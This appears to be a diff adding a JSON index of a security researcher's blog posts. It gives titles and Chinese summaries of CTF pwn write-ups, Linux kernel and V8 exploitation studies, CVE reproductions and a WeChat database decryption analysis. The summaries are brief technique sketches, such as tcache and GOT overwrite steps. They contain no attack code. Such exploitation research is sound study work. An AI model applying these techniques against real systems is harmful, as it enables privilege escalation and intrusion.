@@ -1,0 +1,1449 @@
+{
+  "author": {
+    "id": "chuj",
+    "name": "chuj",
+    "url": "https://chujdk.github.io/index.html"
+  },
+  "posts": [
+    {
+      "title": "fuse + {get,set}xattr 利用模板",
+      "url": "https://chujdk.github.io/mess/fuse--getsetxattr-%E5%88%A9%E7%94%A8%E6%A8%A1%E6%9D%BF.html",
+      "date": "2025-06-09",
+      "summary": "起因 最近由于一些原因，需要使用 fuse + getxattr 这个 gadget。关于这种方法，可以参考这两篇文章： ref1 ， ref2 。 ref2 里面有给出一个模板，但是遗憾的是此模板使用的是 libfuse 提供的类 VFS 接口。使用 libfuse 就需要我们能够把 libfuse 的库链接到 exp 中，许多时候这并非太大的难度，但是有些时候这样比较麻烦。"
+    },
+    {
+      "title": "About",
+      "url": "https://chujdk.github.io/about-en.html",
+      "date": "2023-08-13",
+      "summary": "CN ver whoami I&rsquo;m chuj, a noob binary sercurity researcher. I am currently focusing on Linux kernel security. I used to use NixOS as my primary operating system on a daily basis. I am an experienced user of Neovim. I enjoy running and road biking. I enjoy playing games, but I&rsquo;m more of a laid-back player. Also I enjoy watching movies and listening to music. id -nG Member of Vidar-Team Actively competed in CTF (pwn) from 2021 to 2022. Interned at Chaitin Tech in 2022 for a period of time. Interned at LightYear Lab of AntGroup in 2023 for a period of time. Currently working at HangZhou. links SGColin 的博客 rogerthat esonhugh summer owl Switch Xi4oyu Potat0 4nsw3r ek1ng nameless h4kuy4 Rlesbyfe tOhka d1gger trOuble HuJJ-NB"
+    },
+    {
+      "title": "About",
+      "url": "https://chujdk.github.io/about.html",
+      "date": "2023-08-13",
+      "summary": "EN ver whoami 一个简单的二进制安全研究员，简单在我只会挖非常简单的洞 当前我主要研究 Linux 内核安全 曾经日常使用 nixos ，上班之后不得以用 MacOS ，用 neovim ，还算比较熟练 喜欢跑步🏃‍♂️和（公路）骑行🚴‍♂️"
+    },
+    {
+      "title": "XCTF-Final-hole-wp",
+      "url": "https://chujdk.github.io/wp/1664.html",
+      "date": "2023-03-31",
+      "summary": "这次的 XCTF Final 总长 12 小时，有三道 pwn 题，一道为 Haskell 写成的 lisp 解释器，一道与 Intel sgx 有关。不过我都没怎么看，而是一直在看 hole 这道 v8 题。v8 一直在高速发展，由于我许久没有接触过了，所以不了解新的利用套路——即在构造了 addressOf 和 fakeObject 这两个原语后怎么实现 RCE。最后很遗憾，虽然我实现了上述的两个原语，但是最后并没有做出这题。以下是正文，简述了如何实现 hole 对象的 leak 并且完成对上述原语的构造。 之后的利用我从解出的大佬那里求来了 exp，等我学会就找时间更新 更新：现在我会了，在文章里面简述了一下。"
+    },
+    {
+      "title": "CVE-2022-34918",
+      "url": "https://chujdk.github.io/wp/1663.html",
+      "date": "2023-03-09",
+      "summary": "1 netfilter/iptables/nftables 这里简述一下 netfilter 和 iptables 和 nftables 之间的关系，我对网络的了解甚少，所以在看代码的时候三者的关系给了我不少困扰。 netfilter 是内核中的软件框架，用于网络操作。它提供了许多与数据包过滤，网络地址转换（NAT, Network Address Translation）和端口转发相关的操作。 nftables 是内核中的一个子系统，提供了对数据包、帧、报的过滤和分类。旨在取代 netfilter 的 iptables 部分。他的用户态管理工具为 nft 。 iptables 是一个用户态程序，可以让系统管理员来配置 ip 数据包的过滤规则。通过一个 netfilter 模块实现。 如上可以看出， nft 和 iptables 是同类型工具，用于用户的配置。 nftables 和 iptables 的内核模块同类型，是 nft 和 iptables 这样的工具的“背后的引擎”。他们都是 netfilter 的子系统。而 netfilter 是一个内核的网络软件框架，提供了与网络操作相关的许多接口。"
+    },
+    {
+      "title": "内核堆喷学习——CVE-2021-22555",
+      "url": "https://chujdk.github.io/pwnreview/1659.html",
+      "date": "2023-02-21",
+      "summary": "1 总结 触发漏洞需要 CPA_NET_ADMIN ，我们先 unshare 出自己的名称空间，把权限给自己拉满 漏洞出现在内核的 netfilter 子系统，是一个防火墙系统。用户层中，iptable 即使通过该子系统实现的。"
+    },
+    {
+      "title": "符号执行和混合符号执行，以及一个混合符号执行引擎的实现",
+      "url": "https://chujdk.github.io/software-testing/1655.html",
+      "date": "2022-10-19",
+      "summary": "上个星期我看了一下 EXE 的论文，做了一下 cs6.858 的 lab3。大一的时候其实我就接触过符号执行，但是一直很遗憾没有自己实现过。所以又花了一个周末的时间写了一个混合符号执行的 demo。总的来说我觉得非常有意思。"
+    },
+    {
+      "title": "Sea-of-nodes 论文阅读笔记",
+      "url": "https://chujdk.github.io/compilers/1654.html",
+      "date": "2022-09-13",
+      "summary": "A Simple Graph-Based Intermediate Representation 论文地址 。这是 Sea-of-nodes IR 提出者 Cliff Click 的论文，之前“意识流学” V8 的时候，一直搞不明白 sea of nodes 的思想是什么，也尝试的找了很多资料想学习，但是感觉确实是没看明白。今天，我们通过看论文来学习。论文不难懂，很建议看看论文学习，这篇文章只是我自己的简单总结。"
+    },
+    {
+      "title": "对解密某国产聊天软件聊天数据库的分析",
+      "url": "https://chujdk.github.io/software-testing/1650.html",
+      "date": "2022-07-14",
+      "summary": "最近这段时间研究了一下怎么解密微信的加密数据库。我们知道，微信在各个平台都是加密保存用户聊天记录的，并且没有提供导出明文记录的功能，这给我们窃取自己的聊天记录带来了非常大的麻烦。为了在能够控制自己的 Windows 电脑的前提下（普通用户权限）获取微信的聊天记录，我这两个星期对微信进行了简单的逆向，并且实现了一个简单的工具进行自动化抓取和解密。"
+    },
+    {
+      "title": "compose-a-tetris 使用 compose API 在安卓上实现一个俄罗斯方块",
+      "url": "https://chujdk.github.io/dev/1645.html",
+      "date": "2022-05-26",
+      "summary": "写在前面 为了应付安卓课的大作业，又写了一个俄罗斯方块。很幸运的是，确实学到了很多知识， 虽然这些知识可能没什么用 ，但是还是非常的有意思。上一次写俄罗斯方块是高三的时候是在 hp-39gii 图形机上拿着简陋的 hp-basic 写的，最后写出来的结果是这样的"
+    },
+    {
+      "title": "初探 Windows 用户态堆利用——SCTF-easyheap 和 OgeekCTF2019 babyheap wp",
+      "url": "https://chujdk.github.io/wp/1624.html",
+      "date": "2022-04-01",
+      "summary": "最近这段时间学习了一下 Windows heap 利用，大致感触为 Windows 的 heap 利用比起 Linux 要繁琐许多，因为 Windows 中并没有类似于 __free_hook 这些可以劫持执行流的指针，类似于 Linux got 表的 IAT 表也是只读的，所以要最终实现利用往往需要通过一系列冗长的 leak 找到栈地址然后 rop。 Windows 闭源，虽然微软提供了 pdb 文件，但是想要通过逆向搞懂整个流程还是很有逆向难度的，现在我只能跟着大佬们的总结学习流程，仿佛又回到了之前学 Linux heap exploit 之初看不懂源码意识流 pwn 的时候。 总共做了两道题，SCTF-easyheap 和 OgeekCTF2019 babyheap，两题都是 unlink 实现任意地址读写，不过前一题提供了函数指针可以直接劫持执行流，后者则需要 rop。"
+    },
+    {
+      "title": "虎符网络安全赛道 2022-pwn-vdq-WP",
+      "url": "https://chujdk.github.io/wp/1617.html",
+      "date": "2022-03-21",
+      "summary": "这次比赛里面出现了一个 rust pwn，到最后只有两解。我在比赛中只解出了此题，其实难度并不大，只是漏洞点光靠代码审计难以发现。这里简单分享一下我的解题过程。"
+    },
+    {
+      "title": "D^3CTF2022-d3bpf,d3bpf-v2-WP",
+      "url": "https://chujdk.github.io/wp/1604.html",
+      "date": "2022-03-08",
+      "summary": "这次的 D3 出了两道题，有些师傅觉得第二题 d3bpf-v2 是对 d3bpf 出现非预期的修补，其实并不是。两道题都是入门级的 ebpf 利用题（因为我也只是初学者不可能出的难到哪里去），第一题用的 kernel 版本着实有点奇怪，受到许多 CVE 影响，有些师傅只用了公开的 exp 改改偏移就出了。第二题则是因为新版本的 kernel 中加入了 mitigation，旧的利用方式失效，又似乎没有公开的 exp，所以才出的。最后只有 ROIS 的师傅解出，这也很正常，我其实是参考这位师傅发现的 CVE-2022-23222 的利用总结出的题。师傅人也很好，没有对我剽窃他的思路表示不满。总的来说，如果大家能够借助这两道题了解一下 ebpf 的一种利用套路，我觉得我的目的也就达到了。至于非预期之类的，确实给各位师傅带来了一些不好的体验，十分抱歉。"
+    },
+    {
+      "title": "SUSCTF2022-PWN-WP",
+      "url": "https://chujdk.github.io/wp/1603.html",
+      "date": "2022-03-01",
+      "summary": "这场 SUSCTF 的 pwn 题难度并不算高，我们做到凌晨一点多终于 ak 了 pwn。其中我做了 rain 这题， @xi4oyu 和学弟 @h4kuy4 一起解了 happytree 这题，然后我和 @xi4oyu 一起做了 mujs 和 kqueue。rain 是一个普通的堆题，比较简单，mujs 是一个 js 解释器 pwn，以前没接触过，小语想出了类型混淆的方法，我借此 debug 调偏移最后成功 getshell。kqueue 被非预期打穿了，我们在比赛期间完全没想通能有什么非预期，就参考了 L-team @arttnba3 师傅的 这篇文章 使用 “setxattr + userfaultfd 堆占位”的方法完成了利用。总的来说，学到了新东西，蛮好。这里总结一下解法。"
+    },
+    {
+      "title": "TQLCTF2022-ezvm-WP",
+      "url": "https://chujdk.github.io/wp/1594.html",
+      "date": "2022-02-21",
+      "summary": "上周末参加了奇安信和 Redbud 一起组织的 TQLCTF，pwn 题的质量挺高，都挺有意思的，我在比赛期间尝试做了 unbelievable_write，ezvm 和 trivm-string 三道题，做出两题。其中 unbelievable_write 是一个传统的堆题，free 掉 tcache_prethread_struct 然后 add 即可控制该结构体实现任意地址分配，分配到 free@got 处修改为别的函数即可避免 free 非法堆块导致报错，然后再分配到 target 处覆写即可获得 flag。很简单，就不写 wp 了。然后 trivm-string 这题，三进制平衡虚拟机，确实很有意思，逆向队友帮忙写了一个反汇编器，可惜分析的稍微有点问题。本来的思路是还原栈帧并理清输入流程找到溢出点，但是由于反汇编错误丢失一些 label，看了一会儿还是放弃了。之后准备学习一下反汇编器开发的技巧，再看看能不能写个该虚拟机的反汇编器。"
+    },
+    {
+      "title": "写在大二上结束",
+      "url": "https://chujdk.github.io/mess/1592.html",
+      "date": "2022-02-05",
+      "summary": "又是很长时间没有更新博客了，前段时间各种事情比较多，没有学习什么东西，也就没办法输出成文章，寒假期间也有场 HCTF-game 再办，所以一直没法空下来，这个惯例的期末总结也是拖到了寒假快结束才开始写。回想一下上个学期，说来惭愧，感觉也没学什么东西。"
+    },
+    {
+      "title": "BYTECTF2021-byteview",
+      "url": "https://chujdk.github.io/fuzzing/1589.html",
+      "date": "2021-12-20",
+      "summary": "漏洞分析 比赛的时候分析了很久这道题，结果也没做出来，现在想想主要 C++ 逆向不熟悉。 在 new content 时，如果之前已经 new 过了，就会进 case1。 case 1u : // new content v17 = * (_QWORD * )v5; if ( * (_QWORD * )v5 ) { v21 = * (_QWORD * )v5; v7[ 6 ].m128i_i64[ 0 ] = ( unsigned __int64 )menu ^ v17 & 0xFFFFFFFF0000LL ; v7[ 6 ].m128i_i32[ 2 ] = * (_QWORD * )(v17 + 32 ); v18 = ( struct uniq_ptr_task_req * ) operator new ( 0x18uLL ); v18 -> choice = 1 ; // 另外一种 add 的情况 ref = v18; * ( __m128i * ) & v18 -> old_content = _mm_unpacklo_epi64(( __m128i )v21, ( __m128i )( unsigned __int64 )v7); // old content } 这里面有个 v18->old_content，引用了上一个 content。"
+    },
+    {
+      "title": "CVE-2021-21220",
+      "url": "https://chujdk.github.io/cve/1586.html",
+      "date": "2021-12-16",
+      "summary": "这是一个在今年的 pwn2own 的比赛上披露的漏洞，可以通过 v8 引擎实现任意代码执行，前天看到腾讯玄武实验室推送了 two-birds-with-one-stone-an-introduction-to-v8-and-jit-exploitation 这篇文章，介绍了这个漏洞的成因。漏洞本身是 jit 引擎在选择机器指令时，对 x86 平台下有符号拓展和无符号拓展指令的选择有误造成的，总体来说比较好理解，感觉比较适合作为 v8 jit 利用入门。参考这篇文章和谷歌归档的 exp ，我也完成了利用。这里记录一下。本人也只是刚刚开始摸索浏览器相关的利用，肯定有不对的地方，欢迎指出。"
+    },
+    {
+      "title": "DragonCTF-noflippidy-WP",
+      "url": "https://chujdk.github.io/wp/1570.html",
+      "date": "2021-11-29",
+      "summary": "昨天的 DragonCTF 中出现了一道改编自 DiceCTF 2021 flippidy 的题，原题是一道比较传统的堆题，此题进行了一个小 patch，想要执行原先的漏洞函数，需要满足 fs:0x28 也就是 canary 为 0。很遗憾，比赛的时候草草的看了一眼以为是有什么我不知道的黑魔法可以实现修改 canary 就放弃了，并没有看出漏洞点（说起来这个洞应该挺明显的，没看出来也是挺奇怪的，可能是被概率论期中考弄坏脑子了）。"
+    },
+    {
+      "title": "一些没完成的题目",
+      "url": "https://chujdk.github.io/mess/1569.html",
+      "date": "2021-11-22",
+      "summary": "近期参加了一些比赛，积累了一些没做出来的题，个别题感觉本身也没啥意思，还有一些，由于各种原因，可能无法完全复现，这里简单记录一下思路。 hello_jerry jerry pwn 碰到了许多次了，之前一直没有相关的 wp，再加上 js 解释器相关的 pwn 确实没接触过。这道题应该是比较入门的，相比起别的只给个 bin 的题，至少给了 patch，就是在 array 的 shift 方法执行后多删一个节点，造成数组的 out-of-bound，可以对整个 jerry_heap 进行读写。不过 jerryscript 的几个特点造成较难编写 exp"
+    },
+    {
+      "title": "StarCTF-OOB-WP",
+      "url": "https://chujdk.github.io/pwnreview/1561.html",
+      "date": "2021-11-16",
+      "summary": "博客很久没有更新了，wp 更是很久没有发过了。主要是最近的确没有刷什么题，比赛虽然打的还算多，但是都没有做什么有收获的题，所以都没有发 wp，毕竟没啥意思。不过上个星期的深育杯和 l3ctf 倒是都碰到了新东西，深育杯有一个 Jerry script pwn 和 fastjson pwn。jerryscript 这个之前津门杯也碰到了，但是没有找到 wp 就一直没去复现，所以一直没搞懂，这次又碰到了，既然有官方 wp，就尝试复现一下。fastjson 那个，确实没听说过，有机会也复现一下。l3ctf 则非常时髦，一个似乎是 window 内核 pwn，确实是超出知识面了，还有一个是带 llvm address sanitizer 的 pwn，具体由于时间不够也没仔细分析。不知道官方会不会发布 wp，希望可以跟着复现一下。看来最近能弄的东西还挺多，突然又有了明确的目标了，挺好。下一步先了解一下 Jerry Script 的基本利用方式吧。"
+    },
+    {
+      "title": "祥云杯线下 baby_stack 中的 PAC",
+      "url": "https://chujdk.github.io/pwnreview/1559.html",
+      "date": "2021-10-27",
+      "summary": "之前的祥云杯线下 AWDp 中碰到了一道 ARMv8.3 的题，题目自身有一个简单的栈溢出漏洞，所以修起来十分容易，到最后被修到每轮只有 72 分，但是直到结束也没有一支队伍攻击成功，我猜测大家应该都是被 PACIA 这个神奇的指令卡住了。暂时不考虑在一个断网的比赛环境里面考这样一个比较冷门的防护合不合适，但就题来说还是挺有意思的，我们队在比赛时虽然成功实现了 protect 函数的绕过，但是之后的 rop 就不会了，一方面是不会绕过第一次的 AUTIASP 检测（不过这个可以爆破，1/256 还是可以接受的），另一方面也的确是不会写 aarch64 的 rop。"
+    },
+    {
+      "title": "AFLgo 环境搭建与使用",
+      "url": "https://chujdk.github.io/fuzzing/1556.html",
+      "date": "2021-10-06",
+      "summary": "AFLgo 是一个很有意思的模糊器，但是环境的配置比较麻烦，我碰到了不少错误和问题，这里简单记录一下整个过程。 官方文档 我的环境：全新 Ubuntu 16.04 虚拟机。（不过使用更新的发行版可能会减少一些麻烦的版本问题，我也有点后悔使用这个版本，不过幸好碰到的问题都可以解决）"
+    },
+    {
+      "title": "以库的形式使用 LibFuzzer——使用 LibFuzzer 对 lava-M 的测试",
+      "url": "https://chujdk.github.io/fuzzing/1552.html",
+      "date": "2021-10-02",
+      "summary": "半个多月没有更新博客了，主要还是因为逐渐不再以刷题来学习 pwn 了，少了很多可写的东西，再加上上个月特别的忙，先是军训，训完之后就连着上课，早八到晚八，弄的我心力憔悴，确实没学到什么东西，所以确实没什么可写的。"
+    },
+    {
+      "title": "RCTF2021-musl-WP && 5space 2021 *CTF 2022 强网杯 2022 Musl 赛题 exp",
+      "url": "https://chujdk.github.io/wp/1549.html",
+      "date": "2021-09-13",
+      "summary": "写在一年后 在现在向前看，发现自己也算半个 musl 大师了，自从 RCTF2021 的 musl 题之后的每场比赛只要出现 musl 我都能解出，也从最开始的写一天到现在的两三个小时打通，有时候还能拿个N血。这是什么原因呢？很简单，每道题都是换汤不换药，都是同样的攻击点，也就是 dequeue 操作，堆风水上稍稍有些区别，但也差不多，然后再开个 seccomp 恶心选手。很没有意思啦。还是希望 CTF 比赛不要盲目追求难度（特指的是各种严苛的而又重复的堆利用）能少出现一些重复的套路题，多一些有意思的题目。"
+    },
+    {
+      "title": "COOL 语义分析器实现",
+      "url": "https://chujdk.github.io/dev/1548.html",
+      "date": "2021-09-06",
+      "summary": "COOL 的语义分析主要对作用域和类型做了检测，这是两个必要的检测。未定义或重复定义的变量会对代码生成造成影响；类型不匹配也会造成各种未定义行为。 作用域 语义分析中需要对每个标识符（变量、函数）做检测，主要需要检查是否有未定义的标识符和重复定义的标识符。以 COOL 为例，通过维护一个符号表即可实现检测。这个检测过程可能需要对 AST 进行多次遍历，因为在 COOL 中，全局变量可以在声明前引用，所以至少需要先遍历一次并记录所有的全局变量，这样在第二次遍历时就可以正确判断变量是否有定义。"
+    },
+    {
+      "title": "语法分析简单总结",
+      "url": "https://chujdk.github.io/dev/1546.html",
+      "date": "2021-08-27",
+      "summary": "语法分析是词法分析的后一步，主要的目的就是通过词法分析器生成的 tokens 来生成抽象语法树（ A bstract S yntax T ree，AST）。主要通过上下文无关文法（ C ontext F ree G rammar，CFG）来描述语言的语法，使用相应的算法更具 CFG 来解析 tokens 形成 AST。语法分析应该是编译原理中非常偏向数学的一个方面，并且已经有了很成熟的解决方案，这句话的意思就是语法分析和我学习的方向和目的关系不大。不过这个东西感觉还挺有意思，同时虽然关系不大，但是了解一下还是有必要的，这里简单总结一下，对于算法方面不准备详细写，之后有时间再补上吧（之后学校的编译原理课应该会在 LL，LR 这种地方花很多时间，到时候再来弄也无妨，现在就不浪费生命了）。在慕中语法分析占据了比较大的篇幅，我不觉得自己都听懂了，也有很多不记得了，所以下面写的东西里面可能有很多谬误，仅供参考了哈哈哈。"
+    },
+    {
+      "title": "年轻人的第一个词法分析器——COOL 的 lexer",
+      "url": "https://chujdk.github.io/dev/1538.html",
+      "date": "2021-08-20",
+      "summary": "花了一天多的时间实现了这个词法分析器，从骨架上开始写确实可以少关心很多繁杂的小问题，体验好了许多。 词法分析是编译的第一步，做的事情就是对源代码按照语法规则进行分词，并为其指定对应的类型，形成一系列 <类型，词素> 这样的二元组（token，词法单元）。"
+    },
+    {
+      "title": "InCTF2021-Ancienthouse/NodeKeeper-WP",
+      "url": "https://chujdk.github.io/wp/1537.html",
+      "date": "2021-08-16",
+      "summary": "Ancienthouse 这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能，特别是在多线程下的表现非常优秀。我也是第一次听说这个东西，为了解题简单地了解了一下。在 csdn 上看到 一个很棒的系列 ，如果有兴趣跟着这些文章结合源码就可以理解的比较清楚了。我这里不再细讲，只说和题目相关的。"
+    },
+    {
+      "title": "RaRCTF-PWN-WP",
+      "url": "https://chujdk.github.io/wp/1532.html",
+      "date": "2021-08-10",
+      "summary": "一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。 Archer 这题直接 nc 就可以了"
+    },
+    {
+      "title": "设计模式",
+      "url": "https://chujdk.github.io/design-pattern/1518.html",
+      "date": "2021-08-05",
+      "summary": "个人对设计模式的一点理解，由于没有专研于开发，可能会有不恰当之处，欢迎批评 策略模式 策略模式定义了算法族，分别封装起来，让它们之间可以互相替换，此模式让算法的变化独立于使用算法的客户。——《HEAD FIRST 设计模式》"
+    },
+    {
+      "title": "TCTF2021-uc_masteeer-WP",
+      "url": "https://chujdk.github.io/wp/1515.html",
+      "date": "2021-08-04",
+      "summary": "一道 Unicorn 的题目，之前没听说过这种东西，比赛的时候看都没看，现在来学习复现一下。 关于 unicorn，在看雪上有一篇 Unicorn 在 Android 的应用 写的很详细，这里参考该文章简单介绍一下。"
+    },
+    {
+      "title": "glibc 2.34 malloc 的变化",
+      "url": "https://chujdk.github.io/pwnreview/1512.html",
+      "date": "2021-08-03",
+      "summary": "昨天突然发现 glibc 2.34 发布了，虽然偶数版本似乎一般不会发布在稳定发行版中，但是还是挺好奇的，花了几分钟看了看，发现主要的变动是取消了几个 hook。 首先看原先的 hook 定义处"
+    },
+    {
+      "title": "DASCTF July X CBCTF 4th PWN WP",
+      "url": "https://chujdk.github.io/wp/1508.html",
+      "date": "2021-08-02",
+      "summary": "周末打了一下 DASCTF July X CBCTF 4th 这场比赛，其实这段时间也有一个什么极客巅峰的比赛，还有一个 UIUCTF。极客巅峰错过报名了（以为是晚上十点截止），再加上决赛似乎主要是渗透测试相关的，本来也不是很相关。UIUCTF 感觉质量还挺高的，后来看好像还有专门的 kernel 题，正好这段时间学 kernel 其实挺值得打一下的，但是打完了 DASCTF 才发现有这比赛，所以也错过了。"
+    },
+    {
+      "title": "PWNABLE.TW-seccomp-tools-分析",
+      "url": "https://chujdk.github.io/mess/1506.html",
+      "date": "2021-07-30",
+      "summary": "有一段时间没更新博客了，一方面是被这道题卡住，另一方面也是最近比较颓废，基本上每天都在睡觉。这道题感觉已经做不出来了，所以我就把分析放在这里，以后看看能不能解掉吧。"
+    },
+    {
+      "title": "seccomp 中的 bpf",
+      "url": "https://chujdk.github.io/pwnreview/1495.html",
+      "date": "2021-07-24",
+      "summary": "学习这个问题的原因是想做 pwnable.tw 的 seccomp-tool 一题，此题的 elf 可以读取、模拟、加载用户输入的 bpf 代码，其中加载使用的是 prctl 系统调用，功能号为 PR_GET_SECCOMP。 暂时还不知道怎么做，原来觉得应该是通过 bpf 来完成利用， 总不会是 elf 某处写渣了的溢出 。由于我对 bpf 和 seccomp 不甚了解，所以先花了点时间了解了一下。了解了之后我感觉还真可能是 elf 本身的洞，在 emulate 功能中，也实现了一个类似于 Linux cbpf 解码器和模拟器的虚拟机，这里的代码还是有一点的，还没来的及看，说不定就是这里存在问题。"
+    },
+    {
+      "title": "CVE-2021-3493",
+      "url": "https://chujdk.github.io/software-testing/1481.html",
+      "date": "2021-07-20",
+      "summary": "我复现的第一个 CVE，[font color=\"#8470FF\"]cheers！[/font] 漏洞信息 ， patch ， pwnwiki Ubuntu 所特有的一个权限提升漏洞。 前置知识 capabilities 当普通用户需要做一些 root 权限下才能做的事情时，一种方法是用 sudo 提权，一种方法是使用 suid，比如 passwd 这个程序。但是 suid 给予程序的权限过高，比如 passwd 直接拥有了完整的 root 权限，这就导致一旦 passwd 出现了漏洞，攻击者就可以完全控制目标靶机。Linux 内核在 2.2 版本后引入了 capabilities 机制来切分 root 权限，使得每个线程和文件都可以拥有其需要的一部分 root 权限。"
+    },
+    {
+      "title": "Balsn_CTF_2019-KrazyNote-WP",
+      "url": "https://chujdk.github.io/wp/1480.html",
+      "date": "2021-07-19",
+      "summary": "这道题的利用难度其实比较低，主要的难度在逆向上。说实话，乱七八糟的反编译代码是把我绕惨了。最近这段时间碰到了不少题目都是败在逆向上，我也意识到有必要提高一下逆向水平。"
+    },
+    {
+      "title": "Jarvis OJ-HTTP-WP",
+      "url": "https://chujdk.github.io/wp/1477.html",
+      "date": "2021-07-18",
+      "summary": "最开始的时候我也是想成为一个 web 手的，但是在入门的时候就被绊倒在了门槛上。近期参与的比赛中有碰到 http 服务器后门相关的 pwn 题，看起来属于难度比较低的题目，但是由于我对这个东西没有任何了解，就完全不会做，比较可惜，所以我觉得还是有必要了解一下相关的东西，所以就挑了这一道入门题来做一下。"
+    },
+    {
+      "title": "QWB2021-notebook-WP",
+      "url": "https://chujdk.github.io/wp/1468.html",
+      "date": "2021-07-15",
+      "summary": "强网杯的时候我还一点都不会 kernel pwn，这道题看都没看。这两天尝试复现了一下，从前天下午一直弄到现在才搞出来，费了不少时间，也学到了一些东西，特别地，学习到了之前学习 userfaultfd 和 tty attack 时一些自己不知道自己不知道的知识（这里没有打错哦 ^_^）。"
+    },
+    {
+      "title": "D^3CTF2019-knote-WP",
+      "url": "https://chujdk.github.io/wp/1455.html",
+      "date": "2021-07-13",
+      "summary": "本博客的第 200 篇文章，[font color=\"#FA8072\"] cheer! [/font] 这道题是老学长 Aris 出的，借着这道题学习了一下用 userfaultfd 机制稳定条件竞争的方法。我确实还是比较菜，又是完全照着 ha1vk 师傅的文章 linux kernel pwn学习之条件竞争(二)userfaultfd 学习的。"
+    },
+    {
+      "title": "WCTF2018-klist-WP",
+      "url": "https://chujdk.github.io/wp/1446.html",
+      "date": "2021-07-12",
+      "summary": "本文参考自 ha1vk 师傅的 linux kernel pwn学习之条件竞争(一) 借着这道题初步学习了一下 kernel 中条件竞争的利用。本题主要是通过条件竞争造成 UAF，然后通过 pipe_buffer 造成堆喷射实现提权。"
+    },
+    {
+      "title": "PWNABLE.TW-Kidding-WP",
+      "url": "https://chujdk.github.io/wp/1439.html",
+      "date": "2021-07-09",
+      "summary": "很久没碰过 pwnable 的题目了，这道题其实很久之前也做过了，但是当时没有服务器接反弹的 shell，所以就作罢了，今天新买了一台服务器，不需要在上面跑什么服务，所以把端口全部放开也没关系，就顺便做掉了这道题。"
+    },
+    {
+      "title": "*CTF2019-hackme-WP",
+      "url": "https://chujdk.github.io/wp/1433.html",
+      "date": "2021-07-08",
+      "summary": "首先看一下启动参数 qemu-system-x86_64 \\ -m 256M \\ -nographic \\ -kernel bzImage \\ -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \\ -monitor /dev/null \\ -initrd initramfs.cpio \\ -smp cores = 4,threads = 2 \\ -cpu qemu64,smep,smap 2>/dev/null 开启了 kaslr 和 smep，smap。 这道题是一个堆上溢出造成的 UAF，具体的，在 0x30002 功能，也就是 edit 功能处"
+    },
+    {
+      "title": "TCTF2021-listbook-WP",
+      "url": "https://chujdk.github.io/wp/1431.html",
+      "date": "2021-07-05",
+      "summary": "比赛和考试周相撞，所以比赛没有好好打，整场只看了这道题，比较尴尬的是最后也没看出来漏洞点。这个漏洞点让我觉得这个位置一定是个漏洞点，但是又触发不了这个洞，最后看了别人的 WP 才知道洞的位置猜对了，但是比赛时不知道为什么没触发出来。"
+    },
+    {
+      "title": "写在大一结束",
+      "url": "https://chujdk.github.io/mess/1421.html",
+      "date": "2021-07-05",
+      "summary": "今天出了高代成绩，很幸运没有挂科，既然这门课没有挂那就应该就不会有挂科了，也算是有惊无险的度过了大一下。由于考试周的原因博客很久没更新了，最近这段时间刚刚结束期末考试，也不是很有心情学习，所以先简单的写一下总结吧。"
+    },
+    {
+      "title": "强网杯2018-CORE-WP",
+      "url": "https://chujdk.github.io/wp/1417.html",
+      "date": "2021-06-20",
+      "summary": "这道题是一个 KERNEL 下的 ROP，其实和用户态下的差别也不是特别大，但是调试不是很方便，有地方出现错误，基本上就会造成 qemu 的重启，会浪费很多时间。 start.sh 脚本中的启动命令和参数为"
+    },
+    {
+      "title": "Kernel PWN UAF 的利用和调试",
+      "url": "https://chujdk.github.io/pwnreview/1408.html",
+      "date": "2021-06-19",
+      "summary": "进行调试，必然是 gdb attach 到 qemu 上了，在启动指令中加入 -S -gdb tcp::1234 即可启动一个调试口，在一个新的终端中打开 gdb，使用 targe remote :1234 即可 attach 上去。 光 attach 上去肯定不够，还需要能在恰当的地方打断点，以 CISCN 2017 babydrive 这题为例（题目可以在 ctf-challenge 上面下到）。"
+    },
+    {
+      "title": "《操作系统真像还原》简单读后感",
+      "url": "https://chujdk.github.io/os/1407.html",
+      "date": "2021-06-18",
+      "summary": "花了大概一个月的时间，看了 12 章，到 13 章硬盘分区驱动这里实在是看不下去了，遂决定不再看这本书了，对其操作系统的实现也告一段落了，就停留在系统调用这里了。这里简单总结一下这一个半月学到的东西和我（几乎）看完本书后的感受。"
+    },
+    {
+      "title": "Kernel PWN 环境搭建",
+      "url": "https://chujdk.github.io/pwnreview/1318.html",
+      "date": "2021-06-17",
+      "summary": "一直对 kernel pwn 挺感兴趣的，再加上 libc 那里也没什么新东西可学了，简单题没什么做的意义，难题也不会做，所以准备开始学习 kernel pwn。不过可能最近也没办法太深入的学习，总之先把环境搭起来再说。"
+    },
+    {
+      "title": "《操作系统真像还原》操作系统实现——系统调用",
+      "url": "https://chujdk.github.io/os/1402.html",
+      "date": "2021-06-14",
+      "summary": "到这里，有了前面的铺垫，要说的东西不多，其实没必要单独写出来，但是系统调用毕竟还是比较重要的东西，所以这里还是单独说一下。 Linux 下的系统调用占用的是 0x80 号中断，通过 eax 来选择要调用的功能，我们维护一个函数指针数组，存储各个功能的函数指针，然后用一个简单的汇编函数就可以实现调用"
+    },
+    {
+      "title": "2021强网杯线上赛 baby_diary [强网先锋]orw babypwn WP",
+      "url": "https://chujdk.github.io/wp/1399.html",
+      "date": "2021-06-13",
+      "summary": "强网杯这次我总共做了 3 道比较简单 pwn 题，还有三道题目学长做了，之后看情况复现一下。剩下 7 道基本上不会，还是需要继续学习 baby_diary 这道题就是 2.29+ libc 的 unlink 利用，详细的利用方法可以参见 CTF-WIKI 和这篇 WP （无耻地推销一下，两篇都是我写的 ^_^）"
+    },
+    {
+      "title": "计划表",
+      "url": "https://chujdk.github.io/mess/1398.html",
+      "date": "2021-06-11",
+      "summary": "[login] [goal title=&ldquo;小目标&rdquo;] [item check=&ldquo;false&rdquo;] 整理一下最近写的两个小玩具（fuse 和混合符号执行引擎 demo）的实现细节，争取写两篇博客出来（很久没写了，赶紧水水） [/item]"
+    },
+    {
+      "title": "PWNABLE.TW-food_store-分析",
+      "url": "https://chujdk.github.io/wp/1379.html",
+      "date": "2021-06-10",
